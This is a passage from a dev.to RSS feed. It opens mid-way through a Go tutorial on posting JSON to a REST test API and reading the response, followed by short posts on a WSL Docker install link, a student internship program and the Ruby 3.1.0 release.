&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s"&gt;"bytes"&lt;/span&gt;
    &lt;span class="s"&gt;"encoding/json"&lt;/span&gt;
    &lt;span class="s"&gt;"fmt"&lt;/span&gt;
    &lt;span class="s"&gt;"log"&lt;/span&gt;
    &lt;span class="s"&gt;"net/http"&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;// Post holds the post data that we send or receive from the API server.&lt;/span&gt;
&lt;span class="k"&gt;type&lt;/span&gt; &lt;span class="n"&gt;Post&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;ID&lt;/span&gt;     &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="s"&gt;`json:"id,omitempty"`&lt;/span&gt;
    &lt;span class="n"&gt;Title&lt;/span&gt;  &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="s"&gt;`json:"title"`&lt;/span&gt;
    &lt;span class="n"&gt;Body&lt;/span&gt;   &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="s"&gt;`json:"Body"`&lt;/span&gt;
    &lt;span class="n"&gt;UserID&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="s"&gt;`json:"user_id"`&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c"&gt;// Before we create resource or post on the API server, we need to see the documentation of the REST API we want to use.&lt;/span&gt;
    &lt;span class="c"&gt;// Like what is the URL, version, what are the required fields in the resource object.&lt;/span&gt;
    &lt;span class="c"&gt;// Most of the companies create API docs,  it will have examples in different programming languages along with cURL commands.&lt;/span&gt;
    &lt;span class="c"&gt;// Companies also create SDKs in different programming languages.&lt;/span&gt;
    &lt;span class="c"&gt;// Difference between SDK and API: https://addevice.medium.com/difference-between-an-api-and-an-sdk-anyone-can-understand-3a95bf7fc691&lt;/span&gt;
    &lt;span class="c"&gt;// For example Okta to deal with mangement of users, they are having SDK at:https://github.com/okta/okta-sdk-golang&lt;/span&gt;

    &lt;span class="c"&gt;// Let's build response body for the server we want to post or create resource&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="nb"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Post&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"Title"&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"This is body"&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UserID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"userID"&lt;/span&gt;

    &lt;span class="c"&gt;// Now we need erializes Post 'p' to JSON&lt;/span&gt;
    &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Marshal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatalf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Failed to Serialize to JSON from native Go struct type: %v"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="c"&gt;// here http.Post method expects body as 'io.Redear' which should implement Read() method.&lt;/span&gt;
    &lt;span class="c"&gt;// So, bytes package will take care of that.&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NewBuffer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;// REST APIs means, always think in terms of 'resources'.&lt;/span&gt;
    &lt;span class="c"&gt;// This is good resource: https://www.practical-go-lessons.com/chap-35-build-an-http-client&lt;/span&gt;
    &lt;span class="c"&gt;// This post method uses default http client, so timeout is NOT mentioned.&lt;/span&gt;
    &lt;span class="c"&gt;// Doc of this POST API can be found here: https://jsonplaceholder.typicode.com/guide/.&lt;/span&gt;
    &lt;span class="n"&gt;postURL&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;"https://jsonplaceholder.typicode.com/posts"&lt;/span&gt;
    &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;postURL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"application/json; charset=utf-8"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatalf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Failed to create resource at: %s and the error is: %v&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;postURL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="c"&gt;// Always close the response body&lt;/span&gt;
    &lt;span class="k"&gt;defer&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Body&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c"&gt;// Let us just print the response headers info from the server&lt;/span&gt;
    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Status received from server is: %s"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Status&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"StatusCode received from server is: %d"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Content Type received from Server is: %s"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Header&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"Content-Type"&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="c"&gt;// Like I mentioned in my last article,&lt;/span&gt;
    &lt;span class="c"&gt;// we can read the server response to our native Golang type&lt;/span&gt;
    &lt;span class="c"&gt;// as the map data structure is close to JSON, we could use it&lt;/span&gt;
    &lt;span class="c"&gt;// in fact we could use this for most of the wire formats.&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="nb"&gt;make&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="k"&gt;interface&lt;/span&gt;&lt;span class="p"&gt;{})&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NewDecoder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatalf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Failed to read response body: %v"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="c"&gt;// Let's print the map data by iterating over it.&lt;/span&gt;
    &lt;span class="c"&gt;// Usually in real usecases we use this response to pass to ther functions.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="k"&gt;range&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"%s: %v&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"We have successfully created resource and read the response from API server."&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Thank you.&lt;/p&gt;

</description>
      <category>go</category>
      <category>webdev</category>
      <category>beginners</category>
      <category>restapis</category>
    </item>
    <item>
      <title>WSL Ubuntu Docker install</title>
      <author>liu li</author>
      <pubDate>Sat, 25 Dec 2021 16:11:26 +0000</pubDate>
      <link>https://dev.to/liuli/wsl-ubuntu-docker-install-1403</link>
      <guid>https://dev.to/liuli/wsl-ubuntu-docker-install-1403</guid>
      <description>&lt;p&gt;&lt;a href="https://zenn.dev/sprout2000/articles/95b125e3359694"&gt;https://zenn.dev/sprout2000/articles/95b125e3359694&lt;/a&gt;&lt;/p&gt;

</description>
    </item>
    <item>
      <title>How To Get Free Internship - Devstack Student Internship Program</title>
      <author>Sk Shoyeb</author>
      <pubDate>Sat, 25 Dec 2021 16:00:55 +0000</pubDate>
      <link>https://dev.to/shoyeb001/how-to-get-free-internship-devstack-student-internship-program-49cl</link>
      <guid>https://dev.to/shoyeb001/how-to-get-free-internship-devstack-student-internship-program-49cl</guid>
      <description>&lt;p&gt;If you want to start your career in IT industry, you have to overcome a huge competition. So that students search for &lt;strong&gt;Internships&lt;/strong&gt; in web development, Android Development, Data Science etc. But they cannot find a easy internship for themself. &lt;/p&gt;

&lt;p&gt;Today I will talk about &lt;strong&gt;DSIP Program **which is providing free internship for those students who want to start their **career in Software Development&lt;/strong&gt;. This article will help you in getting &lt;strong&gt;free internship&lt;/strong&gt;. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-dsip-internship"&gt;
  &lt;/a&gt;
  What Is DSIP Internship
&lt;/h2&gt;

&lt;p&gt;DSIP is &lt;strong&gt;Devstack Student Internship Program&lt;/strong&gt;. This internship program is arranged by &lt;strong&gt;Devstack Solutions&lt;/strong&gt;. They are giving &lt;strong&gt;free internship&lt;/strong&gt; in all IT fields. &lt;/p&gt;

&lt;p&gt;Over 1500+ students from 250+ Colleges has been participated in this program. The new internship batch is starting from January, 2022. &lt;/p&gt;

&lt;p&gt;This is a &lt;strong&gt;virtual internship&lt;/strong&gt;. So you can do it from anywhere. You just need a laptop or pc. There are 3 types of internships. These are &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Web Development Internship&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Android Development Internship&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Data Science &amp;amp; ML Internship&lt;/strong&gt; &lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#benefits"&gt;
  &lt;/a&gt;
  Benefits
&lt;/h2&gt;

&lt;p&gt;After completing the internship you will get free certificate, free letter of recommendation. They are also giving free t-shirt swags for the top performers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tasks"&gt;
  &lt;/a&gt;
  Tasks
&lt;/h2&gt;

&lt;p&gt;You have to complete their 2 or 3 tasks. The task details are available in their website. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#apply-process-amp-eligibility"&gt;
  &lt;/a&gt;
  Apply Process &amp;amp; Eligibility
&lt;/h2&gt;

&lt;p&gt;Devstack is taking application from their official website. Apply from Here - &lt;a href="https://www.devstacksolution.in/dsip"&gt;Apply Now&lt;/a&gt;. The eligibility is you have to be a student of B.Tech, BCA, MCA, M-Tech, B.sc, M.sc, BE etc.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;In LinkedIn this internship program is becoming very popular. So I share this program with you. &lt;/p&gt;

</description>
      <category>webdev</category>
      <category>career</category>
      <category>javascript</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Ruby 3.1.0 Released</title>
      <author>Ben Halpern</author>
      <pubDate>Sat, 25 Dec 2021 16:00:23 +0000</pubDate>
      <link>https://dev.to/ben/ruby-310-released-f77</link>
      <guid>https://dev.to/ben/ruby-310-released-f77</guid>
      <description>&lt;h2&gt;
  &lt;a href="#official-post"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.ruby-lang.org/en/news/2021/12/25/ruby-3-1-0-released/"&gt;Official post&lt;/a&gt;
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;YJIT: New experimental in-process JIT compiler disabled by default (needs --yjit cli option), limited to Unix-like x86-64 platforms for now&lt;/li&gt;
&lt;li&gt;debug gem: A new debugger&lt;/li&gt;
&lt;li&gt;error_highlight: Fine-grained error location in backtrace&lt;/li&gt;
&lt;li&gt;IRB Autocomplete and Document Display&lt;/li&gt;
&lt;li&gt;Values in Hash literals and keyword arguments can be omitted&lt;/li&gt;
&lt;li&gt;Pin operator in pattern matching now takes an expression&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>ruby</category>
      <category>rails</category>
      <category>news</category>
      <category>opensource</category>
    </item>
  </channel>
</rss>
